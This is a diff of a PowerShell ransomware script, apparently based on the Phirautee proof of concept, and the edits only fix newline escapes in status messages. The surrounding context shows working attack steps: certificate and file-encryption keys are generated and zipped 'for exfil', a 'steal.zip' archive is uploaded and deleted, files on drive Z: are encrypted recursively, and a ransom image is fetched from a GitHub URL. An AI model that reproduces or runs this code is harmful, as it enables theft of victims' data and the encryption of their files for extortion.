@@ -21,7 +21,7 @@ Export-Certificate -Cert $cert -FilePath "C:\temp\cert.cer" | Out-Null
 #----------------------------------------------------------------------------------------------------------------------------------------
 $encodedcert = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\cert.cer"))
 
-Write-Host "\nBase64 encoded certificate: $encodedcert" -ForegroundColor Blue
+Write-Host "`nBase64 encoded certificate: $encodedcert" -ForegroundColor Blue
 
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Password generator for the certificate
@@ -32,14 +32,14 @@ $pwd2 = [system.web.security.membership]::GeneratePassword(32,15)
 echo ("$pwd2") > c:/temp/sys.txt
 # Write-Host "[+] $pwd2"
 # Start-Sleep -s 1
-Write-Host "\n[+] Installing provider dependency..."
+Write-Host "`n[+] Installing provider dependency..."
 Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force | Out-Null
 
 Write-Host "[+] Grabbing additional dependencies..."
 Install-Module -Name 7Zip4Powershell -RequiredVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
 # Start-Sleep -s 10
 $IV11 = "v9(nnlZl8rz:d)mok*D=+;Th[:}LN;P5C{Dp64|-AX5U"
-Write-Host "\n[+] Compressing certificate password for exfil..." -ForegroundColor White
+Write-Host "`n[+] Compressing certificate password for exfil..." -ForegroundColor White
 Compress-7Zip -Path c:/temp/sys.txt -ArchiveFileName c:/temp/backup.zip -Format Zip -Password "$IV11" | Out-Null
 Write-Host "[+] File c:\temp\backup.zip created..." -ForegroundColor White
 
@@ -76,7 +76,7 @@ Remove-Item c:\temp\backup.zip
 $pwd1 = [system.web.security.membership]::GeneratePassword(30,15)
 echo ("$pwd1") > c:/temp/sys1.txt
 $IV1 = "D^Z@e8507=>YS#)qj;zgBeZWb!0-Tp(hBEAi:2.S5G/"
-Write-Host "\n[+] Compressing target file encryption key for exfil..." -ForegroundColor White
+Write-Host "`n[+] Compressing target file encryption key for exfil..." -ForegroundColor White
 Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1.zip -Format Zip -Password "$IV1" | Out-Null
 Write-Host "[+] File C:\temp\backup1.zip created..." -ForegroundColor White
 
@@ -238,7 +238,7 @@ Write-Host "[-] Upload complete. Deleting archive..." -ForegroundColor White
 Remove-Item c:\temp\steal.zip
 # Start-Sleep -s 5
 Write-Host "[-] Archive deleted..." -ForegroundColor White
-Write-Host "\n[+] Beginning target file encryption..." -ForegroundColor White
+Write-Host "`n[+] Beginning target file encryption..." -ForegroundColor White
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Encrypt files via Phirautee
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -304,7 +304,7 @@ foreach ($i in $(Get-ChildItem Z:\ -recurse -include *.*  | ForEach-Object { $_.
 $ransom = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/ransom.jpg"
 Invoke-WebRequest -Uri $ransom -OutFile "c:/temp/ransom.jpg" | Out-Null
 
-Write-Host "\n\n[+] Target files encrypted..." -ForegroundColor White
+Write-Host "`n`n[+] Target files encrypted..." -ForegroundColor White
 $encodedcert =  [IO.File]::WriteAllBytes("c:/windows/temp/x.cer", [Convert]::FromBase64String($encodedcert))
 #echo (Protect-CmsMessage -Content $pwd -To "c:/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt
 
